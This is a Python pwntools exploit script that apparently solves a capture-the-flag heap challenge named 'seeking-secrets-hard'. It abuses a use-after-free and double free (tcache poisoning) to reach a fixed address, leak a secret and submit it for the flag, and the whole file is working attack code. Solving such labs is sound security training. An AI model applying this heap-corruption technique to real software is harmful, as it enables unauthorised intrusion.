#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-secrets-hard', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

prompt = b"Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(idx, sz):
    sla(prompt, b'malloc')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def free(idx):
    sla(prompt, b'free')
    sla(b'Index: ', str(idx).encode())

def puts(idx):
    sla(prompt, b'puts')
    sla(b'Index: ', str(idx).encode())

def scanf(idx, dt):
    sla(prompt, b'scanf')
    sla(b'Index: ', str(idx).encode())
    p.sendline(dt)

def send_flag():
    sla(prompt, b'send_flag')

secret = 0x0425E31
malloc(0, 0x40)
free(0)
scanf(0, flat(0,0))
free(0)
scanf(0, p64(secret))
malloc(1, 0x40)
malloc(2, 0x40)
# GDB()
puts(2)
p.recvuntil(b'Data: ')
leak = p.recvline().strip()
print(leak)
send_flag()
sla(b'Secret: ', leak)

p.interactive()